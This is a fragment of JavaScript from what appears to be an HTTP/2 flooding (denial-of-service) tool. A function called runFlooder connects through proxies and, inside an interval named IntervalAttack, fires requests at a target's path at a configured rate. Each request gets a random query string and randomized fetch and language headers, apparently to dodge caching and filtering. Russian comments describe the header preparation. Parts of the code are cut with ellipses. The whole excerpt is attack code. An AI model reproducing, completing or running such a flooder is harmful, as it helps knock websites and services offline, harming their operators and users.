...
function runFlooder() {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        // ----------- ПОДГОТОВКА ОДНОГО HEADERS-ДЕРЕВА -----------

        const basePath = parsedTarget.path + "?query=";

        const headers = {
            ...baseHeaders,
            ":path": basePath, // будет перезаписываться
            "accept-encoding": "",
            "sec-fetch-mode": "",
            "sec-fetch-site": "",
            "sec-fetch-dest": "",
        ...
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers[":path"] = basePath + generateRandomString(10, 25);
                    headers["accept-encoding"] = encoding_header[getRandomInt(0, encoding_header.length - 1)];
                    headers["sec-fetch-mode"] = fetch_mode[getRandomInt(0, fetch_mode.length - 1)];
                    headers["sec-fetch-site"] = fetch_site[getRandomInt(0, fetch_site.length - 1)];
                    headers["sec-fetch-dest"] = fetch_dest[getRandomInt(0, fetch_dest.length - 1)];
                    headers["accept-language"] = language_header[getRandomInt(0, language_header.length - 1)];
